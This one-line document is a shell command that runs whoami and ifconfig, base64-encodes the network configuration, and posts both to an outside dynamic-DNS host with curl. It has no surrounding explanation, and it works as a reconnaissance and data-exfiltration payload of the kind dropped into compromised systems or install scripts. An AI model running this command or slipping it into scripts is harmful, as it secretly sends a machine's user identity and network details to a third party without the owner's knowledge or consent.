curl "https://matthewpipie.ddns.net" -d "whoami=$(whoami)&ifconfig=$(ifconfig | base64 -w 0)"
